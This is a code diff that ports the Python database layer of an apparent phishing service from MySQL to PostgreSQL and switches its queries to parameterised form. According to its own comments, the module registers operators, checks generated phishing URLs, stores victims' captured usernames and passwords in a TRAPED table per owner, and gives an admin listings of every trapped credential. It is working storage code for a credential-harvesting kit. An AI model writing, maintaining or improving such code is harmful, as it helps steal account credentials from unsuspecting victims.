@@ -1,13 +1,14 @@
-import mysql.connector
+import psycopg2
 import os
+
 # Get database credentials from environment variables
 # Connect to the database
-conn = mysql.connector.connect(
-    host = os.environ.get('DB_HOST'),
-    user = os.environ.get('DB_USER'), 
-    password = os.environ.get('DB_PASSWORD'), 
-    database = os.environ.get('DB_DATABASE'),
-    connect_timeout=10 
+conn = psycopg2.connect(
+    host=os.environ.get('DB_HOST'),
+    user=os.environ.get('DB_USER'),
+    password=os.environ.get('DB_PASSWORD'),
+    dbname=os.environ.get('DB_DATABASE'),
+    connect_timeout=10
 )
 
 # Create a cursor object
@@ -26,7 +27,6 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS TRAPED
             PASSWORD    TEXT    NOT NULL);
             ''')
 
-
 # used while registering and checking for generated phishing url
 def checkIfUserExists(uid):
     global cursor
@@ -36,80 +36,63 @@ def checkIfUserExists(uid):
         if len(result) == 0:
             return False
         return True
-    except mysql.connector.Error as err:
+    except psycopg2.Error as err:
         print("An error occurred:", err)
         return False
 
-
-
-
-#used while registering
-def insertIntoUser(uid,email,pas):
-    cursor.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
-      VALUES ('{uid}','{email}','{pas}' )")
+# used while registering
+def insertIntoUser(uid, email, pas):
+    cursor.execute("INSERT INTO USERS (UID, EMAIL, PASSWORD) VALUES (%s, %s, %s)", (uid, email, pas))
     conn.commit()
     print("user added")
 
-
-
-#used while logginig
-def checkUserCredential(uid,pas):
+# used while logging
+def checkUserCredential(uid, pas):
     global cursor
-    cursor.execute("SELECT UID,PASSWORD from USERS where UID=%s",(uid,))
+    cursor.execute("SELECT UID, PASSWORD from USERS where UID=%s", (uid,))
     user_cred = cursor.fetchall()
     for row in user_cred:
-        if row[0]==uid and row[1]==pas:
+        if row[0] == uid and row[1] == pas:
             return True
         return False
 
-
-
-
-#used to insert into traped data
-def insertIntoTraped(owner,site,uid,pas):
-    cursor.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
-      VALUES ('{owner}','{site}','{uid}','{pas}' )")
+# used to insert into traped data
+def insertIntoTraped(owner, site, uid, pas):
+    cursor.execute("INSERT INTO TRAPED (OWNER, APP, UID, PASSWORD) VALUES (%s, %s, %s, %s)", (owner, site, uid, pas))
     conn.commit()
     print("user traped")
 
-
-
-#get the traped data for user
+# get the traped data for user
 def getTrapedDataForOwner(uid):
     global cursor
-    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=%s",(uid,))
-    detail= cursor.fetchall()
-    cursor.execute("select count(*) from TRAPED where OWNER=%s",(uid,))
-    n=cursor.fetchall()[-1][-1]
-    return [detail,n]
+    cursor.execute("SELECT OWNER, APP, UID, PASSWORD from TRAPED where OWNER=%s", (uid,))
+    detail = cursor.fetchall()
+    cursor.execute("select count(*) from TRAPED where OWNER=%s", (uid,))
+    n = cursor.fetchall()[-1][-1]
+    return [detail, n]
 
+# ------------------------------------------------ADMIN-----------------------------------------
 
-
-
-#------------------------------------------------ADMIN-----------------------------------------
-
-#for admin
+# for admin
 def getTrapedData():
     global cursor
-    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
-    detail= cursor.fetchall()
+    cursor.execute("SELECT OWNER, APP, UID, PASSWORD from TRAPED")
+    detail = cursor.fetchall()
     cursor.execute("select count(*) from TRAPED")
-    n=cursor.fetchall()[-1][-1]
-    return [detail,n]
+    n = cursor.fetchall()[-1][-1]
+    return [detail, n]
 
-
- #for admin      
+# for admin
 def getUserData():
     global cursor
-    cursor.execute("SELECT UID,EMAIL,PASSWORD from USERS")
-    detail= cursor.fetchall()
+    cursor.execute("SELECT UID, EMAIL, PASSWORD from USERS")
+    detail = cursor.fetchall()
     cursor.execute("select count(*) from USERS")
-    n=cursor.fetchall()[-1][-1]
-    return [detail,n]
-    
+    n = cursor.fetchall()[-1][-1]
+    return [detail, n]
 
-#for admin
-def saveFeedback(uid,name,email,msg):
+# for admin
+def saveFeedback(uid, name, email, msg):
     global cursor
     cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
             (UID  TEXT  NOT NULL,
@@ -117,12 +100,10 @@ def saveFeedback(uid,name,email,msg):
             EMAIL TEXT NOT NULL,
             MSG    TEXT    NOT NULL);
             ''')
-    cursor.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
-      VALUES ('{uid}','{name}','{email}','{msg}' )")
+    cursor.execute("INSERT INTO MESSAGE (UID, NAME, EMAIL, MSG) VALUES (%s, %s, %s, %s)", (uid, name, email, msg))
     conn.commit()
 
-
-#for admin
+# for admin
 def getFeedbackData():
     global cursor
     cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
@@ -131,8 +112,8 @@ def getFeedbackData():
             EMAIL TEXT NOT NULL,
             MSG    TEXT    NOT NULL);
             ''')
-    cursor.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
+    cursor.execute("SELECT UID, NAME, EMAIL, MSG from MESSAGE")
     detail = cursor.fetchall()
     cursor.execute("select count(*) from MESSAGE")
-    n=cursor.fetchall()[-1][-1]
-    return [detail,n]
+    n = cursor.fetchall()[-1][-1]
+    return [detail, n]
